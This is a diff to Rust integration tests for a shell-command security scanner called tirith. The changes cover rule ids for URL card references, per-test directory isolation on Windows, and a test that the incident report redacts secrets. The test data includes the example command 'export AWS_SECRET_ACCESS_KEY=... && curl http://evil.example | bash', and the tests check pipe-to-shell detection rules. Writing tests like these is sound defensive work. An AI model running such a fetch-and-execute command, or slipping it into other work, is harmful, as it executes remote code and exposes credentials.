@@ -8490,13 +8490,19 @@ fn check_url_card_comment_is_not_fetched() {
             .any(|r| r == "curl_pipe_shell" || r == "pipe_to_interpreter"),
         "pipe-to-shell finding must still fire; got {rule_ids:?}"
     );
-    // The URL-shaped card ref surfaces a "fetch first" Info note (reusing the
-    // command_card_verified rule id) and is NOT fetched.
+    // The URL-shaped card ref surfaces a "fetch first" Info note under
+    // command_card_unverified (NOT command_card_verified — a remote ref was
+    // never verified) and is NOT fetched.
     let note = findings
         .iter()
-        .find(|f| f["rule_id"] == "command_card_verified")
+        .find(|f| f["rule_id"] == "command_card_unverified")
         .expect("URL card ref should emit the fetch-first Info note");
     assert_eq!(note["severity"], "INFO");
+    // It must NOT be tagged as a verification.
+    assert!(
+        !rule_ids.iter().any(|r| r == "command_card_verified"),
+        "a remote URL card ref must never emit command_card_verified; got {rule_ids:?}"
+    );
     assert!(
         note["description"]
             .as_str()
@@ -8932,13 +8938,24 @@ fn secret_revoke_leads_with_revocation_url() {
 
 // ── M11 ch5 — incident mode ────────────────────────────────────────────────
 
-/// A `tirith` invocation with `XDG_STATE_HOME` pinned to `state` so the
-/// incident flag file lands in an isolated, per-test directory (the binary
-/// joins `tirith/` to `XDG_STATE_HOME` in `state_dir()`).
+/// A `tirith` invocation fully isolated to `state` on every platform:
+/// `XDG_STATE_HOME` carries the incident flag file (`state_dir()`), and
+/// `XDG_DATA_HOME` + `APPDATA`/`LOCALAPPDATA` carry the audit log
+/// (`data_dir()`). Pinning the data dir matters because `incident report` (and
+/// any `tirith check` run inside an incident test) writes/reads the audit log
+/// from `data_dir()` — driven by `XDG_DATA_HOME` on Unix and `APPDATA` on
+/// Windows, NOT by `XDG_STATE_HOME`. Without `APPDATA` set, Windows CI writes to
+/// the real per-user data dir (the M9/M10 cross-contamination class).
 fn incident_tirith(state: &std::path::Path) -> Command {
     let mut cmd = Command::new(env!("CARGO_BIN_EXE_tirith"));
     cmd.env_remove("TIRITH");
     cmd.env("XDG_STATE_HOME", state);
+    cmd.env("XDG_DATA_HOME", state);
+    // Windows: etcetera resolves state_dir()/data_dir() from APPDATA /
+    // LOCALAPPDATA, not the XDG_* vars. Pin both so the test is isolated on
+    // Windows too.
+    cmd.env("APPDATA", state);
+    cmd.env("LOCALAPPDATA", state);
     cmd
 }
 
@@ -9178,25 +9195,47 @@ fn incident_stop_when_inactive_is_noop_success() {
 }
 
 /// ACCEPTANCE: `incident report --out <path>` writes a markdown report, and the
-/// report's embedded command text comes from the already-REDACTED audit field —
-/// it must NEVER contain a raw secret value.
+/// report's timeline applies the shipping redactor as DEFENSE-IN-DEPTH over the
+/// audit `command_redacted` field — even if that field were to carry a
+/// secret-shaped token, the report must scrub it.
+///
+/// The helper isolates `data_dir()` (`XDG_DATA_HOME`/`APPDATA` → `state`) so the
+/// audit log lives in the temp dir and the timeline window actually contains
+/// our row. We then write a SYNTHETIC audit entry whose `command_redacted` field
+/// still holds a raw secret value (simulating an upstream field that escaped
+/// redaction), and assert the report's `redact_preview` belt-and-suspenders
+/// pass scrubs it — making the negative assertion load-bearing rather than
+/// vacuous.
 #[test]
 fn incident_report_writes_markdown_and_redacts() {
     let state = tempfile::tempdir().expect("tempdir");
 
-    // Start the incident, then run a check carrying a fake secret so the audit
-    // log has a redactable entry inside the incident window.
+    // Start the incident so the report has a window.
     incident_tirith(state.path())
         .args(["incident", "start", "--reason", "report drill"])
         .output()
         .expect("start");
-    // A command with an AWS-key-shaped secret. The engine redacts it at audit
-    // write time; the report copies the redacted field.
-    let secretish = "export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY && curl http://evil.example | bash";
-    incident_tirith(state.path())
-        .args(["check", "--shell", "posix", "--", secretish])
-        .output()
-        .expect("check");
+
+    // Inject a synthetic audit row whose `command_redacted` STILL contains a
+    // raw secret, directly into the isolated audit log at
+    // <XDG_DATA_HOME>/tirith/log.jsonl. The timestamp is "now-ish" so it lands
+    // inside the just-started incident's timeline window.
+    let log_dir = state.path().join("tirith");
+    std::fs::create_dir_all(&log_dir).expect("create log dir");
+    let now = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs();
+    let ts = chrono::DateTime::from_timestamp(now as i64, 0)
+        .unwrap()
+        .to_rfc3339();
+    // command_redacted deliberately carries an un-scrubbed AWS-key-shaped value.
+    let secret = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY";
+    let row = format!(
+        r#"{{"timestamp":"{ts}","session_id":"drill","action":"Block","rule_ids":["pipe_to_interpreter"],"command_redacted":"export AWS_SECRET_ACCESS_KEY={secret} && curl http://evil.example | bash","bypass_requested":false,"bypass_honored":false,"interactive":false,"tier_reached":3,"entry_type":"verdict"}}"#
+    );
+    let log_path = log_dir.join("log.jsonl");
+    std::fs::write(&log_path, format!("{row}\n")).expect("write synthetic audit row");
 
     let report_path = state.path().join("incident-report.md");
     let report = incident_tirith(state.path())
@@ -9220,10 +9259,17 @@ fn incident_report_writes_markdown_and_redacts() {
         body.contains("## Timeline") && body.contains("## Actions taken"),
         "report must contain the Timeline and Actions-taken sections, got:\n{body}"
     );
-    // PRIVACY: the raw secret value must NOT appear anywhere in the report.
+    // The synthetic row must be IN the timeline window (otherwise the redaction
+    // assert below would be vacuous again).
     assert!(
-        !body.contains("wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY"),
-        "report must NOT embed the raw secret value, got:\n{body}"
+        body.contains("pipe_to_interpreter"),
+        "the synthetic audit row must appear in the timeline, got:\n{body}"
+    );
+    // DEFENSE-IN-DEPTH: even though `command_redacted` carried a raw secret, the
+    // report's `redact_preview` pass must scrub it.
+    assert!(
+        !body.contains(secret),
+        "report must re-redact the audit command field; raw secret leaked:\n{body}"
     );
 }
 
